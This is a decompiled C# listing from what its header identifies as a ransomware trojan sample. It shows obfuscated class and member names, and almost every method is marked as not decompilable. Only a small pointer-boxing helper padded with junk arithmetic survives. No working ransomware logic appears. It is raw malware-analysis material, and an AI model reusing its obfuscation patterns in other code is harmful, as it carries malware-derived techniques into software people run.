// Decompiled with JetBrains decompiler
// Type: 68AD704C
// Assembly: JustSvK was here ;D, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 17F13239-28E0-4F33-9D80-95AE56A139B0
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Ransom.MSIL.Blocker.gen-16c7811696471900b3a83f0b8949a6f14fe1aaf67c424d9ceeedce51dc3016fe.exe

using System;
using System.Reflection;

public class \u00368AD704C
{
  private readonly byte[] \u0034134556E;
  private byte[] \u003447A1AD8;
  private readonly object \u0037928162D;
  private \u00352520576 \u00342B37016;
  private long \u00355FD0545;
  private readonly int \u00312E71C45;
  private int \u0031B4F76F1;
  private uint \u0031B370493;

  public \u00368AD704C(long _param1)
  {
    // ISSUE: unable to decompile the method.
  }

  public \u00368AD704C(byte[] _param1)
  {
    // ISSUE: unable to decompile the method.
  }

  public class \u00343BB4FB9
  {
    protected bool \u003041F33FF(byte[] _param1)
    {
      // ISSUE: unable to decompile the method.
    }

    protected void \u0037A9C2BB9()
    {
      // ISSUE: unable to decompile the method.
    }

    protected void \u0033271154B(string _param1, string _param2)
    {
      // ISSUE: unable to decompile the method.
    }

    private void \u00378291BFD(string _param1, bool _param2)
    {
      // ISSUE: unable to decompile the method.
    }

    public string \u0032F041C4B
    {
      get
      {
        // ISSUE: unable to decompile the method.
      }
      private set
      {
        // ISSUE: unable to decompile the method.
      }
    }

    public string \u0036EFF0DF6
    {
      get
      {
        // ISSUE: unable to decompile the method.
      }
      private set
      {
        // ISSUE: unable to decompile the method.
      }
    }

    public \u00343BB4FB9()
    {
      // ISSUE: unable to decompile the method.
    }

    public static unsafe object \u0036D380796(void* _param0)
    {
      uint num1 = 709458700;
      void* ptr = _param0;
      uint num2 = num1 / 851335062U;
      // ISSUE: type reference
      RuntimeTypeHandle handle = __typeref (void*);
      uint num3 = num2 / 389175591U;
      Type typeFromHandle = Type.GetTypeFromHandle(handle);
      uint num4 = num3 - 67731103U;
      return Pointer.Box(ptr, typeFromHandle);
    }

    public static unsafe void* \u0032C4C05ED(object _param0) => Pointer.Unbox(_param0);
  }

  public class \u00377CB0251 : \u00368AD704C.\u00343BB4FB9
  {
    string \u00351B94CFF { }
  }

  public class \u0032E0E0A70 : \u00368AD704C.\u00343BB4FB9
  {
  }
}
